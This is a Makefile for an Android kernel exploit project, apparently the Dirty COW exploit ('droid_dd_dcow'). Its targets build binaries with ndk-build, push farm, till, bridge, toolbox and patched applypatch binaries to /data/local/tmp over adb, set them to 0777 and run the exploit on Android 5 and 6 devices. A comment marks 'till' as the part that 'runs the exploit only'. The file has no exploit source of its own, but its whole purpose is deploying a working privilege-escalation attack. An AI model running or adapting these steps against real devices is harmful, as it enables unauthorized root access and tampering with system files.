all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=arm64-v8a APP_PLATFORM=android-23

log: 
	adb logcat | grep -a droid_dd_dcow

run5: build 
		adb push cmd_list.txt /data/local/tmp/cmd_list.txt
		adb push toolbox_android-5.1.1_r2 /data/local/tmp/toolbox
		adb push applypatch_android-5.11_r2 /data/local/tmp/till		
		adb push libs/arm64-v8a/farm /data/local/tmp/farm
		adb push libs/arm64-v8a/till /data/local/tmp/till
		adb push libs/arm64-v8a/bridge /data/local/tmp/bridge
		adb shell chmod 0777 /data/local/tmp/bridge /data/local/tmp/till /data/local/tmp/farm /data/local/tmp/toolbox
		adb shell /data/local/tmp/farm autoremove

run6: build 
		adb push cmd_list.txt /data/local/tmp/cmd_list.txt
		adb push toolbox_android_6.01_r1 /data/local/tmp/toolbox
#------------- if you don't need applypatch use till which runs the exploit only, no apply patch
#			   till exits without harm for subsequent calls		
#		uncomment the following line to completely disable applypatch during exploit
#		adb push libs/arm64-v8a/till /data/local/tmp/till
#		BUT make sure to comment out following line containing 'applypatch__android_6.01_r1' using one or more #
		adb push applypatch_android_6.01_r1 /data/local/tmp/till
##---------------------------------------------------------------------------------- the remaining parts remain unchanged
		adb push libs/arm64-v8a/farm /data/local/tmp/farm
		adb push libs/arm64-v8a/bridge /data/local/tmp/bridge
		adb shell chmod 0777 /data/local/tmp/bridge /data/local/tmp/till /data/local/tmp/farm /data/local/tmp/toolbox
		adb shell /data/local/tmp/farm autoremove

clean:
	rm -rf libs
	rm -rf obj

